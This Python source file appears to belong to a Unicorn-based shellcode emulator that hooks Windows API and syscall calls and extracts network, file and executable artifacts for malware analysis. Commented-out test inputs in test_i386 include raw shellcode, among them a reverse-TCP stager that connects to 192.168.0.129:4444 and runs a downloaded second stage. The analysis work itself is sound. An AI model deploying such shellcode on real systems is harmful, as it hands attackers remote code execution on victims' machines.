#!/usr/bin/env python

from __future__ import print_function
from unicorn import *
from unicorn.x86_const import *
from capstone import *
from struct import pack, unpack
from collections import defaultdict
from pathlib import Path
from .modules import *
from .DLLs.dict_signatures import *
from .DLLs.dict2_signatures import *
from .DLLs.dict3_w32 import *
from .DLLs.dict4_ALL import *
from .DLLs.hookAPIs import *
from .DLLs.syscall_signatures import *
from .helper.emuHelpers import *
from .helper.sharemuDeob import *
# from .helper.shellMemory import *

import sys
import json
import pefile
import re
import os
import argparse
import colorama
import binascii
import traceback
# from sharemuDeob import *
# artifacts2= [] 
# net_artifacts = []
# file_artifacts = []
# exec_artifacts = []

class EMU():
    def __init__(self):
        self.maxCounter=500000
        self.maxLoop = 50000
        self.entryOffset=0
        self.winVersion = "Windows 7"
        self.winSP = "SP1"

artifacts = []
net_artifacts = []
file_artifacts = []
exec_artifacts = []
programCounter = 0
verbose = True

CODE_ADDR = 0x12000000
CODE_SIZE = 0x1000
STACK_ADDR = 0x17000000
EXTRA_ADDR = 0x18000000
codeLen=0
with open(os.path.join(os.path.dirname(__file__), 'WinSysCalls.json'), 'r') as syscall_file:
    syscall_dict = json.load(syscall_file)
export_dict = {}
logged_calls = defaultdict(list)
loggedList = []
logged_syscalls = []
logged_types = defaultdict(list)
custom_dict = defaultdict(list)
logged_dlls = []
createdProcesses = []
paramValues = []
network_activity = {}
jmpInstructs = {}

traversedAdds=set()
loadModsFromFile = True
foundDLLAddresses = os.path.join(os.path.dirname(__file__), "foundDLLAddresses.txt")
outFile = open(os.path.join(os.path.dirname(__file__), 'emulationLog.txt'), 'w')
cleanStackFlag = False
stopProcess = False
cleanBytes = 0
prevInstruct = []
expandedDLLsPath = os.path.join(os.path.dirname(__file__), "DLLs\\")
prevInstructs = []
loopInstructs = []
loopCounter = 0
verOut = ""
bVerbose = True

colorama.init()

red ='\u001b[31;1m'
gre = '\u001b[32;1m'
yel = '\u001b[33;1m'
blu = '\u001b[34;1m'
mag = '\u001b[35;1m'
cya = '\u001b[36;1m'
whi = '\u001b[37m'
res = '\u001b[0m'
res2 = '\u001b[0m'

def loadDlls(mu):
    global export_dict
    global expandedDLLsPath
    path = 'C:\\Windows\\SysWOW64\\'

    # Create foundDllAddresses.txt if it doesn't already exist
    if not os.path.exists(foundDLLAddresses):
        Path(foundDLLAddresses).touch()

    runOnce=False
    for m in mods:
        if os.path.exists(mods[m].d32) == False:
            print("[*] Unable to locate ", mods[m].d32, ". It is likely that this file is not included in your version of Windows.")
            continue
        if os.path.exists("%s%s" % (expandedDLLsPath, mods[m].name)):
            dll=readRaw(expandedDLLsPath+mods[m].name)
            # Unicorn line to dump the DLL in our memory
            mu.mem_write(mods[m].base, dll)
        # Inflate dlls so PE offsets are correct
        else:
            if not runOnce:
                print("Warning: DLLs must be parsed and inflated from a Windows OS.\n\tThis may take several minutes to generate the initial emulation files.\n\tThis initial step must be completed only once from a Windows machine.\n\tThe emulation will not work without these.")
                runOnce=True
            pe=pefile.PE(mods[m].d32)
            for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                try:
                    export_dict[mods[m].base + exp.address] = (exp.name.decode(), mods[m].name)
                except:
                    export_dict[mods[m].base + exp.address] = "unknown_function"

            dllPath = path + mods[m].name
            rawDll = padDLL(dllPath, mods[m].name, expandedDLLsPath)

            # Dump the dll into unicorn memory
            mu.mem_write(mods[m].base, rawDll)

    saveDLLsToFile(export_dict, foundDLLAddresses)

    with open(foundDLLAddresses, "r") as f:
        data = f.read()
    APIs = data.split("\n")
    for each in APIs:
        vals=each.split(", ")
        try:
            address=int(vals[0], 16)
            apiName=vals[1]
            dllName=vals[2]

            if apiName not in export_dict:
                export_dict[address] = ((apiName, dllName))
        except:
            pass

def breakLoop(uc, jmpFlag, jmpType, op_str, addr, size):
    # print("Jmp Flag: ", jmpFlag)
    eflags = uc.reg_read(UC_X86_REG_EFLAGS)

    # False = continue, True = jump
    if boolFollowJump(jmpFlag, jmpType, eflags):
        # print("[*] TAKING THE JUMP")
        if "0x" in op_str:
            jmpLoc = addr + signedNegHexTo(op_str)
        else:
            jmpLoc = addr + int(op_str)
        uc.reg_write(UC_X86_REG_EIP, jmpLoc)
    else:
        # print("[*] SKIPPING THE JUMP")
        uc.reg_write(UC_X86_REG_EIP, addr + size)


def hook_WindowsAPI(uc, addr, ret, size, funcAddress):
    global stopProcess
    global cleanBytes

    bprint ("funcName", hex(funcAddress), hex(addr))
    # input()
    ret += size
    push(uc, ret)
    eip = uc.reg_read(UC_X86_REG_EIP)
    esp = uc.reg_read(UC_X86_REG_ESP)

    try:
        funcName = export_dict[funcAddress][0]
        dll = export_dict[funcAddress][1]
        dll = dll[0:-4]

        # Log usage of DLL
        if dll not in logged_dlls:
            logged_dlls.append(dll)
    except:
        funcName = "DIDNOTFIND- " + str(hex((funcAddress)))
    try:
        funcInfo, cleanBytes = globals()['hook_' + funcName](uc, eip, esp, export_dict, addr)
        logCall(funcName, funcInfo)

    except:
        try:
            bprint("hook_default", hex(funcAddress))
            hook_default(uc, eip, esp, funcAddress, export_dict[funcAddress][0], addr)
        except:
            print("\n\tHook failed at " + str(hex(funcAddress)) + ".")
    
    fRaw.add(funcAddress, funcName)
    if funcName == 'ExitProcess':
        stopProcess = True
    if 'LoadLibrary' in funcName and uc.reg_read(UC_X86_REG_EAX) == 0:
        print("\t[*] LoadLibrary failed. Emulation ceasing.")
        stopProcess = True

    uc.reg_write(UC_X86_REG_EIP, EXTRA_ADDR)

    return ret

def hook_code(uc, address, size, user_data):
    # print ("hook_code: uc, address, size, user_data", uc, hex(address), size, user_data)
    global cleanBytes, verbose
    global outFile
    global programCounter
    global cleanStackFlag
    global stopProcess
    global prevInstruct
    global prevInstructs
    global loopInstructs
    global loopCounter
    global traversedAdds
    funcName = ""
    # traversedAdds.add(address) # do not delete
    
    addressF=address
    if stopProcess == True or address == 0x0:
        uc.emu_stop()

    programCounter += 1
    if programCounter > em.maxCounter and em.maxCounter > 0:
        print("Exiting emulation because max counter of {em.maxCounter} reached")
        uc.emu_stop()

    instructLine = ""

    if verbose:
        instructLine+=giveRegs(uc)
        instructLine += "0x%x" % address + '\t'

    try:
        shells = uc.mem_read(address, size)
    except Exception as e:
        print ("Error: ", e)
        print(traceback.format_exc())
        instructLine += " size: 0x%x" % size + '\t'   # size is overflow - why so big?
        outFile.write("abrupt end:  " + instructLine)
        # print (instructLine)
        # shells = uc.mem_read(address, 1)
        return # terminate func early   --don't comment - we want to see the earlyrror

    ret = address
    base = 0

    # Print out the instruction
    mnemonic=""
    op_str=""
    t=0

    fRaw.addBytes(shells, addressF-CODE_ADDR, size)
    finalOut=uc.mem_read(CODE_ADDR + em.entryOffset,codeLen)
    fRaw.giveEnd(finalOut)
    for i in cs.disasm(shells, address):

        val = i.mnemonic + " " + i.op_str # + " " + shells.hex()
        if t==0:
            mnemonic=i.mnemonic
            op_str=i.op_str
            # print ("mnemonic op_str", mnemonic, op_str)

        if verbose:
            shells = uc.mem_read(base, size)
            instructLine += val + '\n'
            outFile.write(instructLine)
            loc = 0
            for i in cs.disasm(shells, loc):
                val = i.mnemonic + " " + i.op_str
        t+=1

    # If jmp instruction, increment jmp counter to track for infinite loop
    jmpFlag = getJmpFlag(mnemonic)
    if jmpFlag != "":
        if address not in jmpInstructs:
            jmpInstructs[address] = 1
        else:
            jmpInstructs[address] += 1

        if jmpInstructs[address] >= em.maxLoop:
            breakLoop(uc, jmpFlag, mnemonic, op_str, address, len(shells))
            jmpInstructs[address] = 0


    funcAddress = controlFlow(uc, mnemonic, op_str)

    # Hook usage of Windows API function
    if funcAddress > NTDLL_BASE and funcAddress < WTSAPI32_TOP:
        ret = hook_WindowsAPI(uc, address, ret, size, funcAddress)

    # # Hook usage of Windows Syscall

    if address == 0x5000:
        hook_sysCall(uc, address)

    if address == 0x1000:
        stopProcess = True

    if cleanStackFlag == True:
        cleanStack(uc, cleanBytes)
        cleanStackFlag = False

    # If parameters were used in the function, we need to clean the stack
    if ret == EXTRA_ADDR:
        cleanStackFlag = True

def hook_syscallBackup(uc, eip, esp, funcAddress, funcName, callLoc):
    try:
        try:
            apiDict = dict_kernel32[funcName]
        except:
            try:
                apiDict = dict_ntdll[funcName]
            except:
                apiDict = dict_user32[funcName]

        paramVals = getParams(uc, esp, apiDict, 'dict1')

        paramTypes = ['DWORD'] * len(paramVals)
        paramNames = ['arg'] * len(paramVals)

        retVal = 32
        uc.reg_write(UC_X86_REG_EAX, retVal)
        funcInfo = (funcName, hex(callLoc), hex(retVal), 'INT', paramVals, paramTypes, paramNames, False)
        logCall(funcName, funcInfo)
    except Exception as e:
        print("Error!", e)
        print(traceback.format_exc())

def hook_syscallDefault(uc, eip, esp, funcAddress, funcName, callLoc):
    returnType, paramVals, paramTypes, paramNames, nt_tuple = '','','','',()
    dll = 'ntdll'
    try:
        nt_tuple = syscall_signature[funcName]
        paramVals = getParams(uc, esp, nt_tuple, 'ntdict')
        paramTypes = nt_tuple[1]
        paramNames = nt_tuple[2]
        returnType = nt_tuple[3]
    except:
        hook_syscallBackup(uc, eip, esp, funcAddress, funcName, callLoc)


    retVal = findRetVal(funcName, syscallRS)

    funcInfo= (funcName, hex(callLoc), hex(retVal), returnType, paramVals, paramTypes, paramNames, False)
    logCall(funcName, funcInfo)

def hook_sysCall(uc, address):
    global logged_dlls
    global stopProcess

    syscallID = uc.reg_read(UC_X86_REG_EAX)
    sysCallName = syscall_dict[em.winVersion][em.winSP][str(syscallID)]
    exportAddress = 0
    eip = uc.reg_read(UC_X86_REG_EIP)
    esp = uc.reg_read(UC_X86_REG_ESP)

    try:
        funcInfo = globals()['hook_' + sysCallName](uc, eip, esp, address)
        logCall(sysCallName, funcInfo)
    except:
        try:
            hook_syscallDefault(uc, eip, esp, exportAddress, sysCallName, address)
        except:
            print("\n\tHook failed at " + str(hex(exportAddress)) + ".")
    if sysCallName == 'NtTerminateProcess':
        stopProcess = True
    if 'LoadLibrary' in sysCallName and uc.reg_read(UC_X86_REG_EAX) == 0:
        print("\t[*] LoadLibrary failed. Emulation ceasing.")
        stopProcess = True

    uc.reg_write(UC_X86_REG_EIP, EXTRA_ADDR)
    syscall_info = ()
    logged_syscalls.append(syscall_info)

# Most Windows APIs use stdcall, so we need to clean the stack
def cleanStack(uc, numBytes):
    if numBytes > 0:
        esp = uc.reg_read(UC_X86_REG_ESP)
        uc.reg_write(UC_X86_REG_ESP, esp+numBytes)

    # reset cleanBytes
    global cleanBytes
    cleanBytes = 0

# Get the parameters off the stack
def findDict(funcAddress, funcName, dll=None):
    try:
        global cleanBytes
        if dll == None:
            dll = export_dict[funcAddress][1]
            dll = dll[0:-4]
        paramVals = []

        dict4 = tryDictLocate('dict4', dll)
        dict2 = tryDictLocate('dict2', dll)
        dict1 = tryDictLocate('dict', dll)

        bprint ("dll", dll)
        # Log usage of DLL
        if dll not in logged_dlls:
            logged_dlls.append(dll)

        # Use dict three if we find a record for it
        if funcName in dict3_w32:
            return dict3_w32[funcName], 'dict3', dll

        # Use dict2 if we can't find the API in dict1
        elif funcName in dict2:
            return dict2[funcName], 'dict2', dll

        # Use dict four (WINE) if we find a record for it
        elif funcName in dict4:
            return dict4[funcName], 'dict4', dll

        # If all else fails, use dict 1
        elif funcName in dict1:
            return dict1[funcName], 'dict1', dll
        else:
            bprint ("NOT FOUND!")
            return "none", "none", dll
    except Exception as e:
        bprint("Oh no!!!", e)
        bprint(traceback.format_exc())

def getParams(uc, esp, apiDict, dictName):
    global cleanBytes

    paramVals = []

    if dictName == 'dict1':
        numParams = apiDict[0]
        for i in range(0, numParams):
            p = uc.mem_read(esp + (i*4+4), 4)
            p = unpack('<I', p)[0]
            paramVals.append(hex(p))
        cleanBytes = apiDict[1]
    else:
        numParams = apiDict[0]
        for i in range(0, numParams):
            paramVals.append(uc.mem_read(esp + (i*4+4), 4))
            paramVals[i] = unpack('<I', paramVals[i])[0]

            # Check if parameter is pointer, then convert
            if apiDict[1][i][0] == 'P':
                try:
                    pointer = paramVals[i]
                    pointerVal = getPointerVal(uc,pointer)
                    paramVals[i] = buildPtrString(pointer, pointerVal)
                except:
                    pass

            # Check if the type is a string
            elif "STR" in apiDict[1][i]:
                try:
                    paramVals[i] = read_string(uc, paramVals[i])
                except:
                    pass
            else:
                paramVals[i] = hex(paramVals[i])

        # Go through all parameters, and see if they can be interpreted as a string
        for i in range (0, len(paramVals)):
            if "STR" not in apiDict[1][i]:
                try:
                    p = int(paramVals[i], 16)
                    if (0x40000000 < p and p < 0x50010000):
                        string = read_string(uc, p)
                        if len(string) < 30:
                            paramVals[i] = string
                except:
                    pass

        cleanBytes = apiDict[0] * 4

    return paramVals

# If we haven't manually implemented the function, we send it to this function
# This function will simply find parameters, then log the call in our dictionary
def hook_default(uc, eip, esp, funcAddress, funcName, callLoc):
    try:
        dictName =apiDict=""
        bprint (hex(funcAddress), funcName)
        apiDict, dictName, dll = findDict(funcAddress, funcName)
        # bprint ("", apiDict, dictName, dll, funcName)
        if apiDict=="none" and dll=="wsock32":

            apiDict, dictName, dll = findDict(funcAddress, funcName, "ws2_32")
            bprint ("", apiDict, dictName, dll)

        paramVals = getParams(uc, esp, apiDict, dictName)

        if dictName != 'dict1':
            paramTypes = apiDict[1]
            paramNames = apiDict[2]
        else:
            paramTypes = ['DWORD'] * len(paramVals)
            paramNames = ['arg'] * len(paramVals)

        dictR1 = globals()['dictRS_'+dll]
        retVal=findRetVal(funcName, dictR1)
        bprint ("returnVal", funcName, retVal)
        uc.reg_write(UC_X86_REG_EAX, retVal)

        retValStr=getRetVal(retVal)
        # print (retValStr, type(retValStr))
        if retValStr==32:
            funcInfo = (funcName, hex(callLoc), hex(retValStr), 'INT', paramVals, paramTypes, paramNames, False)
        else:
            funcInfo = (funcName, hex(callLoc), (retValStr), '', paramVals, paramTypes, paramNames, False)
        logCall(funcName, funcInfo)
    except Exception as e:
        print ("Error!", e)
        print(traceback.format_exc())

def logCall(funcName, funcInfo):
    global paramValues
    # logged_calls[funcName].append(funcInfo)
    loggedList.append(funcInfo)
    paramValues += funcInfo[4]

def findArtifacts():
    artifacts = []
    net_artifacts = []
    file_artifacts = []
    exec_artifacts = []

    for p in paramValues:
        artifacts += re.findall(r"[a-zA-Z0-9_.-]+\.\S+", str(p))
        net_artifacts += re.findall(r"http|ftp|https:\/\/?|www\.?[a-zA-Z]+\.com|eg|net|org", str(p))
        net_artifacts += re.findall(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", str(p))
        # file_artifacts += re.findall(r"[a-zA-z]:\\[^\\]*?\.\S+|.*(\\.*)$|.exe|.dll", str(p))
        rFile = ".*(\\.*)$"
        # print(p, type(p))
        # result = re.search(rFile, str(p))
        # if result:
        #     file_artifacts.append(str(p))
        # print(file_artifacts)

        # file_artifacts
        exec_artifacts += re.findall(r"\S+\.exe", str(p))
        artifacts += net_artifacts + file_artifacts


    # result = re.search(r, i)

    #     if result:
    #         web_artifacts.append(i)
    #     if i[-4:] == ".exe":
    #         exec_artifacts.append(i)

    #     result = re.search(rfile,i)
    #     if result:
    #         file_artifacts.append(i)

    # print (net_artifacts)
    # print (net_artifacts)

    return list(dict.fromkeys(artifacts)), list(dict.fromkeys(net_artifacts)), list(dict.fromkeys(file_artifacts)), list(dict.fromkeys(exec_artifacts))


def getArtifacts():
    artifacts, net_artifacts, file_artifacts, exec_artifacts = findArtifacts()

# Test X86 32 bit
def test_i386(mode, code):
    global artifacts2
    global outFile
    global cs
    global codeLen
    codeLen=len(code)
    # code = b"\xEB\x5E\x6A\x30\x5E\x64\x8B\x06\x8B\x40\x0C\x8B\x70\x1C\xAD\x96\xAD\x8B\x78\x08\xC3\x60\x89\xFD\x8B\x45\x3C\x8B\x7C\x05\x78\x01\xEF\x8B\x4F\x18\x8B\x5F\x20\x01\xEB\xE3\x33\x49\x8B\x34\x8B\x01\xEE\x31\xC0\x99\xFC\xAC\x84\xC0\x74\x07\xC1\xCA\x0D\x01\xC2\xEB\xF4\x3B\x54\x24\x28\x75\xE2\x8B\x5F\x24\x01\xEB\x66\x8B\x0C\x4B\x8B\x5F\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24\x1C\x61\xC3\x83\xEC\x14\xE8\x9A\xFF\xFF\xFF\x31\xDB\x53\x68\x50\x77\x6E\x64\x54\x5B\x89\x5D\xFC\x31\xDB\x53\x68\x72\x6C\x64\x21\x68\x6F\x20\x77\x6F\x68\x48\x65\x6C\x6C\x54\x5B\x89\x5D\xF8\x31\xDB\x53\x68\x2E\x64\x6C\x6C\x68\x65\x72\x33\x32\x66\xBB\x75\x73\x66\x53\x54\x5B\x68\x8E\x4E\x0E\xEC\x57\xE8\x69\xFF\xFF\xFF\x53\xFF\xD0\x89\x45\xF4\x68\xAA\xFC\x0D\x7C\x57\xE8\x58\xFF\xFF\xFF\x31\xDB\x53\x68\x42\x6F\x78\x41\x68\x73\x61\x67\x65\xBB\x7A\x23\x0B\x1D\x81\xF3\x7A\x6E\x6E\x6E\x53\x89\xE3\x43\x53\x8B\x5D\xF4\x53\xFF\xD0\x89\x45\xF0\x8B\x45\xF0\x31\xDB\x53\x8B\x5D\xF8\x53\x8B\x5D\xFC\x53\x31\xDB\x53\xFF\xD0\x68\x7E\xD8\xE2\x73\x57\xE8\x14\xFF\xFF\xFF\x31\xC9\x51\xFF\xD0"
    # code = b"\xE8\xA7\x00\x00\x00\x60\x31\xD2\x64\x8B\x52\x30\x90\x8B\x52\x0C\x90\x8B\x52\x14\x90\x89\xE5\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x90\x90\x31\xC0\xAC\x90\x90\x90\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEC\x52\x57\x8B\x52\x10\x90\x90\x8B\x42\x3C\x90\x01\xD0\x8B\x40\x78\x90\x85\xC0\x74\x58\x01\xD0\x8B\x58\x20\x90\x01\xD3\x50\x8B\x48\x18\x90\x85\xC9\x74\x46\x49\x31\xFF\x8B\x34\x8B\x01\xD6\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x90\x90\x75\xDE\x58\x8B\x58\x24\x90\x90\x01\xD3\x66\x8B\x0C\x4B\x90\x8B\x58\x1C\x90\x90\x01\xD3\x8B\x04\x8B\x90\x90\x01\xD0\x89\x44\x24\x24\x90\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xE9\x6B\xFF\xFF\xFF\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x90\x90\x54\x90\x90\x68\x4C\x77\x26\x07\x90\x90\x89\xE8\x90\x90\xFF\xD0\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF\xD5\x6A\x0A\x68\xC0\xA8\x00\x81\x90\x68\x02\x00\x11\x5C\x89\xE6\x50\x90\x90\x50\x90\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5\x97\x6A\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0A\xFF\x4E\x08\x75\xEC\xE8\x64\x00\x00\x00\x6A\x00\x6A\x04\x56\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7E\x36\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x83\xF8\x00\x7D\x25\x58\x68\x00\x40\x00\x00\x6A\x00\x50\x68\x0B\x2F\x0F\x30\xFF\xD5\x57\x68\x75\x6E\x4D\x61\xFF\xD5\x5E\x5E\xFF\x0C\x24\x0F\x85\x6C\xFF\xFF\xFF\xEB\x9E\x01\xC3\x29\xC6\x75\xC4\xC3\xBB\xF0\xB5\xA2\x56\x6A\x00\x53\xFF\xD5"
    # code = b"\x83\xEC\x18\xC7\x45\xF4\x00\x00\x16\x00\xC7\x45\xF8\x00\x00\x00\x00\x6A\x40\x68\x00\x30\x00\x00\x8D\x45\xF4\x50\x6A\x00\x8D\x45\xF8\x50\x6A\xFF\xB8\x15\x00\x00\x00\x31\xC9\x8D\x14\x24\x64\xFF\x15\xC0\x00\x00\x00"

    try:
        # Initialize emulator
        mu = Uc(UC_ARCH_X86, mode)
        mu.mem_map(0x00000000, 0x20050000)

        loadDlls(mu)

        # write machine code to be emulated to memory
        mu.mem_write(CODE_ADDR, code)
        mu.mem_write(EXTRA_ADDR, b'\xC3')

        # initialize stack
        mu.reg_write(UC_X86_REG_ESP, STACK_ADDR)
        mu.reg_write(UC_X86_REG_EBP, STACK_ADDR)

        # Push entry point addr to top of stack. Represents calling of entry point.
        push(mu, ENTRY_ADDR)
        mu.mem_write(ENTRY_ADDR, b'\x90\x90\x90\x90')

        if mode == UC_MODE_32:
            print(cya + "\n\t[*]" + res2 + " Emulating x86_32 shellcode")
            cs = Cs(CS_ARCH_X86, CS_MODE_32)
            allocateWinStructs32(mu)

        elif mode == UC_MODE_64:
            print(cya + "\n\t[*]" + res2 + " Emulating x86_64 shellcode")
            cs = Cs(CS_ARCH_X86, CS_MODE_64)
            allocateWinStructs64(mu)

        # tracing all instructions with customized callback
        mu.hook_add(UC_HOOK_CODE, hook_code)


    except Exception as e:
        print(e)

    try:
        # print("before", mu.mem_read(CODE_ADDR + em.entryOffset,20))
        
        mu.emu_start(CODE_ADDR + em.entryOffset, CODE_ADDR + len(code))
        # print("after", mu.mem_read(CODE_ADDR + em.entryOffset,20))
        # finalOut=mu.mem_read(CODE_ADDR + em.entryOffset,len(code))
        # fRaw.giveEnd(finalOut)
        # print ("testout",test)
        print("\n\n\n\n")
    except Exception as e:
        print ("opps")
        print("\t",e)
        print("traceback", traceback.format_exc())
        print("opps end")


    # try:
    #     finalOut = uc.mem_read(CODE_ADDR, len(code))
    #     print ("finalOut", finalOut)
    # except Exception as e:
    #     print (e)
    #     print ("HELP!!!\n\n\n\n\n")
    outFile.close()
    # now print out some registers
    artifacts, net_artifacts, file_artifacts, exec_artifacts = findArtifacts()
    # except:
    #     pass

    # now print out some registers
    artifacts, net_artifacts, file_artifacts, exec_artifacts = findArtifacts()

    print(cya+"\t[*]"+res2+" CPU counter: " + str(programCounter))
    print(cya+"\t[*]"+res2+" Emulation complete")

def startEmu(arch, data, vb):
    global verbose
    verbose = vb
    # fRaw.testBytesAdd()
    if arch == 32:
        test_i386(UC_MODE_32, data)

    # fRaw.show2()
    fRaw.merge2()
    # print ("COMPLETED!!!")
    fRaw.completed()
    # print (fRaw.APIs)
    # print ("COMPLETED2!!!")

    # fRaw.findAPIs()
def haha():
    fRaw.show()


em=EMU()